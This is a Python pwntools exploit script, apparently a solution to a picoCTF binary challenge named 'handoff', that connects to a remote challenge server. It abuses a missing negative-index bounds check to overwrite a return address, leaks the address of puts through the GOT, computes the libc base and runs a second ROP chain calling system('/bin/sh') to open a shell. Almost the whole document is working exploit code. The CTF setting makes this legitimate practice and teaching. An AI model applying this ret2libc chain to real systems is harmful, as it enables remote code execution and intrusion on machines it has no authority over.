import pwn
import struct

libc = pwn.ELF("libc.so.6")
e = pwn.ELF("./handoff")
#p = pwn.process("./handoff")
p = pwn.remote("shape-facility.picoctf.net", 52507)

"""
We can write the msg buffer of negative entries since Option 2 does not perform negative bounds checks. This allows us to
overwrite the return address of fgets. We use this to leak the address of libc by reading the GOT entry of puts using puts.
Since we can only write the first 24 bytes of the ROP chain into the entries[-1].msg buffer, we need to use the subsequent
entries[0].name buffer to write the remaining 8 bytes. After leaking the libc address, execute system with /bin/sh to spawn
a shell and read the flag. We need to find out which libc version is being used, which can be done by checking out the page
offset of puts_libc and using the website https://libc.rip to get the correct version. Since there are multiple returned
versions, we simply leak the page offsets of a few other libc functions and narrow it down to the correct libc version.
In the second ROP chain, which executes system, we need to insert an additional ret to align the stack to a 16-byte boundary,
otherwise system throws an exception when executing movaps.
"""

puts_got = e.got["puts"]
puts_plt = e.plt["puts"]
vuln = e.symbols["vuln"]
pop_rdi_gadget = 0x4014b3

p.sendline(b"1")
p.sendline(pwn.p64(vuln))

# !!! If we send the entire 64 bytes, then the next scanf will read a non-valid character and exit. Since we do not need
# to write the last byte since fgets sets it to 0 anyways, we send a valid character.
p.sendline(b"2")
p.sendline(b"-1")
p.send(b"A"*40 + pwn.p64(pop_rdi_gadget) + pwn.p64(puts_got) + pwn.p64(puts_plt)[:-1] + b"1")
p.recvuntil(b"What message would you like to send them?\n")

puts_libc_addr = struct.unpack("<Q", p.recvline()[:-1] + b"\x00\x00")[0]
print(f"Puts libc addr: {hex(puts_libc_addr)}")

puts_libc_off = libc.symbols["puts"]
system_libc_off = libc.symbols["system"]
base_libc_addr = puts_libc_addr - puts_libc_off
system_libc_addr = base_libc_addr + system_libc_off
bin_sh_off = 0x1d8678
bin_sh_addr = base_libc_addr + bin_sh_off

print(f"Base libc addr: {hex(base_libc_addr)}")
print(f"System libc addr: {hex(system_libc_addr)}")

ret_gadget = 0x40101a
# Send some garbage because the first scanf will not work
p.sendline(b"1")
p.sendline(b"1")
p.sendline(pwn.p64(system_libc_addr))

p.sendline(b"2")
p.sendline(b"-1")
p.send(b"A"*40 + pwn.p64(ret_gadget) + pwn.p64(pop_rdi_gadget) + pwn.p64(bin_sh_addr))

p.interactive()
